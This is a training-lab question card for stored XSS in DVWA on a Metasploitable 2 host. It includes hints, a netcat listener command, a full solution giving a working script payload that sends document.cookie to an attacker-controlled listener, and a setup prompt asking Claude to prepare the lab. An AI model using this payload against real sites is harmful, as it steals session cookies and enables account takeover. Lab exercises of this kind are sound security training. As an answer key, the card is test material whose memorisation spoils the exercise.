# Q070 — DVWA Stored XSS

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `browser, nc` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On DVWA stored XSS guestbook, post a payload that steals `document.cookie` and sends to `http://192.168.52.128:8000/`. Provide the payload.

---

## 🎯 Flag Format

```
payload=<html>
```

Example: `payload=<script>new Image().src='http://192.168.52.128:8000/?c='+document.cookie</script>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Use `<img>` or `<script>` tag.
</details>

<details>
<summary>Hint 2</summary>

Run a netcat listener on Parrot to receive the cookie.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# Set up: nc -lvnp 8000 on Parrot
# Submit in Message field
```

Visiting the page exfiltrates cookies to attacker.

**Answer:** `payload=<script>new Image().src='http://192.168.52.128:8000/?c='+document.cookie</script>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q070:
1. Verify Metasploitable2 (192.168.52.129) up; DVWA security=low; logged-in session.
2. On Parrot start capture: nc -lvnp 8000 (in a dedicated terminal).
3. Parrot IP 192.168.52.128 reachable from Metasploitable2's browser context (the stored XSS fires when anyone views the guestbook — no real second victim needed, viewing from Parrot's Firefox triggers exfil).

Report back: "Lab ready for Q070 — DVWA security=low, nc listener on Parrot:8000".
```
